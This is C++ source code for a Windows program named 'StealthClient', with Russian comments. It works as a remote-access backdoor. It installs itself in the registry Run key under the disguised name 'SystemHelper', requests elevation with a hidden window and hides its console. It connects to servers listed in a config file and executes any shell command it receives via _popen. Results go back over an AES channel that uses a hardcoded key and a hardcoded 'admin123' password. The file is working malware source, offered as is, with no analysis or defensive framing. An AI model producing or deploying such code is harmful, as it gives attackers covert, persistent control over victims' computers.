#define _WIN32_WINNT 0x0601
#include <boost/asio.hpp>
#include <boost/asio/steady_timer.hpp>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <fstream>
#include <thread>
#include <filesystem>
#include <vector>
#include <string>
#include <shlobj.h>
#include <shellapi.h>
#include <sstream>
#include <iomanip>
#include <atomic>
#include <queue>
#include <mutex>
#include <condition_variable>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "libcrypto.lib")

using json = nlohmann::json;
namespace asio = boost::asio;
namespace fs = std::filesystem;
using asio::ip::tcp;
using namespace std::chrono_literals;

const unsigned char encryption_key[32] = {
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0
};

class AESEncryptor {
public:
    static std::string encrypt(const std::string& plaintext) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return "";

        unsigned char iv[EVP_MAX_IV_LENGTH];
        RAND_bytes(iv, EVP_MAX_IV_LENGTH);

        std::string ciphertext;
        ciphertext.resize(plaintext.size() + EVP_MAX_IV_LENGTH);

        int out_len1 = 0, out_len2 = 0;

        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, encryption_key, iv);
        EVP_EncryptUpdate(ctx,
            (unsigned char*)&ciphertext[0], &out_len1,
            (const unsigned char*)plaintext.data(), (int)plaintext.size());
        EVP_EncryptFinal_ex(ctx,
            (unsigned char*)&ciphertext[0] + out_len1, &out_len2);

        EVP_CIPHER_CTX_free(ctx);
        ciphertext.resize(out_len1 + out_len2);

        return std::string((char*)iv, EVP_MAX_IV_LENGTH) + ciphertext;
    }

    static std::string decrypt(const std::string& ciphertext) {
        if (ciphertext.size() < EVP_MAX_IV_LENGTH) return "";

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return "";

        const unsigned char* iv = (const unsigned char*)ciphertext.data();
        const unsigned char* ct = (const unsigned char*)ciphertext.data() + EVP_MAX_IV_LENGTH;
        size_t ct_size = ciphertext.size() - EVP_MAX_IV_LENGTH;

        std::string plaintext;
        plaintext.resize(ct_size + EVP_MAX_IV_LENGTH);

        int out_len1 = 0, out_len2 = 0;
        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, encryption_key, iv);
        EVP_DecryptUpdate(ctx,
            (unsigned char*)&plaintext[0], &out_len1, ct, (int)ct_size);
        EVP_DecryptFinal_ex(ctx,
            (unsigned char*)&plaintext[0] + out_len1, &out_len2);

        EVP_CIPHER_CTX_free(ctx);
        plaintext.resize(out_len1 + out_len2);

        return plaintext;
    }
};

class StealthClient : public std::enable_shared_from_this<StealthClient> {
public:
    static std::shared_ptr<StealthClient> create(asio::io_context& io_context) {
        return std::shared_ptr<StealthClient>(new StealthClient(io_context));
    }

    void start() {
        auto self = shared_from_this();
        asio::post(io_context_, [this, self]() {
            connect();
            });
    }

private:
    StealthClient(asio::io_context& io_context)
        : io_context_(io_context),
        resolver_(io_context_),
        reconnect_timer_(io_context_) {
        load_server_list();
    }

    void load_server_list() {
        char appdata_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
            fs::path config_path = fs::path(appdata_path) / "SystemHelper" / "servers.txt";

            if (!fs::exists(config_path)) {
                create_default_config(config_path);
            }

            std::ifstream file(config_path);
            std::string line;
            while (std::getline(file, line)) {
                size_t pos = line.find(':');
                if (pos != std::string::npos) {
                    std::string ip = line.substr(0, pos);
                    int port = std::stoi(line.substr(pos + 1));
                    servers_.push_back({ ip, port });
                }
            }
        }
    }

    void create_default_config(const fs::path& path) {
        fs::create_directories(path.parent_path());
        std::ofstream file(path);
        file << "127.0.0.1:8080\n";
        file << "192.168.1.100:8080\n";
    }

    void connect() {
        if (servers_.empty()) {
            schedule_reconnect();
            return;
        }

        current_server_index_ = (current_server_index_ + 1) % servers_.size();
        auto& server = servers_[current_server_index_];

        auto self = shared_from_this();
        resolver_.async_resolve(server.first, std::to_string(server.second),
            [this, self](const boost::system::error_code& ec, tcp::resolver::results_type endpoints) {
                if (ec) {
                    schedule_reconnect();
                    return;
                }

                socket_ = std::make_unique<tcp::socket>(io_context_);
                asio::async_connect(*socket_, endpoints,
                    [this, self](const boost::system::error_code& ec, const tcp::endpoint&) {
                        if (ec) {
                            socket_.reset();
                            schedule_reconnect();
                            return;
                        }

                        // Успешное подключение
                        authenticate();
                        read_header();
                    });
            });
    }

    void schedule_reconnect() {
        auto self = shared_from_this();
        reconnect_timer_.expires_after(10s);
        reconnect_timer_.async_wait([this, self](const boost::system::error_code& ec) {
            if (!ec) connect();
            });
    }

    void authenticate() {
        json auth = {
            {"action", "admin_auth"},
            {"password", "admin123"}
        };
        send_encrypted(auth.dump());
    }

    void read_header() {
        if (!socket_ || !socket_->is_open()) {
            handle_error();
            return;
        }

        auto self = shared_from_this();
        asio::async_read(*socket_, asio::buffer(header_buffer_),
            [this, self](const boost::system::error_code& ec, size_t) {
                if (ec) {
                    handle_error();
                    return;
                }

                // Безопасное копирование данных
                uint32_t size;
                memcpy(&size, header_buffer_.data(), sizeof(size));
                size = ntohl(size);

                if (size > 10 * 1024 * 1024) {
                    handle_error();
                    return;
                }

                read_body(size);
            });
    }

    void read_body(uint32_t size) {
        if (!socket_ || !socket_->is_open()) {
            handle_error();
            return;
        }

        auto self = shared_from_this();
        body_buffer_.resize(size);
        asio::async_read(*socket_, asio::buffer(body_buffer_),
            [this, self, size](const boost::system::error_code& ec, size_t) {
                if (ec) {
                    handle_error();
                    return;
                }

                std::string ciphertext(body_buffer_.data(), size);
                std::string plaintext = AESEncryptor::decrypt(ciphertext);
                if (!plaintext.empty()) {
                    try {
                        json data = json::parse(plaintext);
                        handle_command(data);
                    }
                    catch (const std::exception& e) {
                        // Логирование ошибки
                    }
                }

                // Читаем следующее сообщение
                read_header();
            });
    }

    void send_encrypted(const std::string& plaintext) {
        if (!socket_ || !socket_->is_open()) {
            return;
        }

        // Сохраняем данные в shared_ptr
        auto encrypted_ptr = std::make_shared<std::string>(AESEncryptor::encrypt(plaintext));
        uint32_t size = htonl(static_cast<uint32_t>(encrypted_ptr->size()));

        std::vector<asio::const_buffer> buffers;
        buffers.push_back(asio::buffer(&size, sizeof(size)));
        buffers.push_back(asio::buffer(*encrypted_ptr));

        auto self = shared_from_this();
        asio::async_write(*socket_, buffers,
            [this, self, encrypted_ptr](const boost::system::error_code& ec, size_t) {
                if (ec) {
                    handle_error();
                }
            });
    }

    void handle_command(const json& data) {
        if (data.contains("command")) {
            std::string result = execute_command(data["command"].get<std::string>());

            json response = {
                {"action", "command_result"},
                {"result", result}
            };
            send_encrypted(response.dump());
        }
        else if (data.contains("action")) {
            std::string action = data["action"];
            if (action == "recv_file") {
                if (!data.contains("path") || !data.contains("local_path")) return;
                std::string file_path = data["path"];
                std::string save_path = data["local_path"];
                start_file_reception(file_path, save_path);
            }
        }
    }

    void start_file_reception(const std::string& file_path, const std::string& save_path) {
        json request = {
            {"action", "file_start"},
            {"path", save_path},
            {"size", 0}
        };
        send_encrypted(request.dump());
    }

    std::string execute_command(const std::string& cmd) {
        char buffer[128];
        std::string result = "";
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
        if (!pipe) return "Error executing command";
        while (fgets(buffer, sizeof(buffer), pipe.get())) {
            if (buffer) result += buffer;
        }
        return result;
    }

    void handle_error() {
        socket_.reset();
        schedule_reconnect();
    }

    asio::io_context& io_context_;
    tcp::resolver resolver_;
    std::unique_ptr<tcp::socket> socket_;
    std::vector<std::pair<std::string, int>> servers_;
    size_t current_server_index_ = 0;
    asio::steady_timer reconnect_timer_;
    std::array<char, 4> header_buffer_;
    std::vector<char> body_buffer_;
};

bool is_admin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup = nullptr;

    if (AllocateAndInitializeSid(
        &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        if (!CheckTokenMembership(nullptr, AdministratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }
    return isAdmin == TRUE;
}

bool install_autostart() {
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    char exePath[MAX_PATH] = { 0 };
    if (!GetModuleFileNameA(nullptr, exePath, MAX_PATH)) {
        RegCloseKey(hKey);
        return false;
    }

    const std::string value_name = "SystemHelper";
    const std::string value_data = "\"" + std::string(exePath) + "\" /background";

    LSTATUS status = RegSetValueExA(hKey, value_name.c_str(), 0, REG_SZ,
        reinterpret_cast<const BYTE*>(value_data.c_str()),
        static_cast<DWORD>(value_data.size() + 1));

    RegCloseKey(hKey);
    return status == ERROR_SUCCESS;
}

bool restart_as_admin() {
    char exePath[MAX_PATH] = { 0 };
    if (!GetModuleFileNameA(nullptr, exePath, MAX_PATH)) {
        return false;
    }

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = exePath;
    sei.lpParameters = "/background";
    sei.nShow = SW_HIDE;

    return ShellExecuteExA(&sei) == TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Проверяем аргументы командной строки
    bool is_background = strstr(lpCmdLine, "/background") != nullptr;

    // Проверяем права администратора
    if (!is_admin()) {
        if (!is_background) {
            if (restart_as_admin()) {
                return 0; // Завершаем текущий экземпляр
            }
        }
    }

    // Устанавливаем в автозагрузку
    install_autostart();

    asio::io_context io_context;

    // Создаем клиент и запускаем его
    auto client = StealthClient::create(io_context);
    client->start();

    // Запускаем обработку асинхронных операций
    std::thread io_thread([&io_context] {
        try {
            auto work_guard = asio::make_work_guard(io_context);
            io_context.run();
        }
        catch (const std::exception& e) {
            // Логирование ошибки
        }
        });

    // Для фонового режима скрываем окно консоли
    if (is_background) {
        FreeConsole();
    }

    // Оставляем основной поток для обработки сообщений Windows
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Останавливаем IO context и ждем завершения потока
    io_context.stop();
    if (io_thread.joinable()) {
        io_thread.join();
    }

    return 0;
}